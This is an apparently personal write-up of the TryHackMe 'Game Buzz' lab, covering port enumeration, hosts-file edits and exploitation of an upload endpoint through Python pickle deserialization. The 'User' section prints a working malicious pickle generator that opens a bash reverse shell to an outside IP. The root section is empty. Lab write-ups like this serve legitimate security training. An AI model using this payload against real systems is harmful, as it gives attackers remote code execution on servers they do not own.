# Game Buzz

![image](https://user-images.githubusercontent.com/5285547/128932672-b10c018a-8d55-4bfd-8edb-1d4100c0a480.png)

Romm link: https://tryhackme.com/room/gamebuzz

## Enum

Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Incognito
```



```
sudo nano /etc/hosts  

incognito.com
dev.incogniot.com
```
---
## Port 80 

Checking the main website didn't show much, apart from a button that loads a file with a .pkl extension. 

![image](https://user-images.githubusercontent.com/5285547/128937818-90d5dd7c-561d-4463-8a1c-a79311deb7b5.png)

Also we find a domain name. 

```
sudo nano /etc/hosts  
ip incognito.com
```

## dev.incognito.com

```
sudo nano etc/hosts
IP dev.incogniot.com
```

http://dev.incognito.com/secret/upload/

Finding the endpoint we can try to upload a file of our own. Based on the .pkl file extension this hints at python pickle deserilization. 

## User

If we can get our file to be read from the main website we can get RCE. 

test.pkl (rev shell)

```
#!/usr/bin/env python3
import pickle, os
class pickleSerilization(object):
    def __reduce__(self):
        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.8.153.120/9999 0>&1'",))
pickle.dump(pickleSerilization(), open("rev_shell", "wb"))
```
Running the code gives us the rev_shell file. Upload this at "http://dev.incognito.com/secret/upload/" then call it with the main website.

![image](https://user-images.githubusercontent.com/5285547/128940779-a030648b-e70f-49e1-b35f-53d343d13e96.png)

Now we can access the /home/dev2/ folder to find the user flag. 

---
## Root


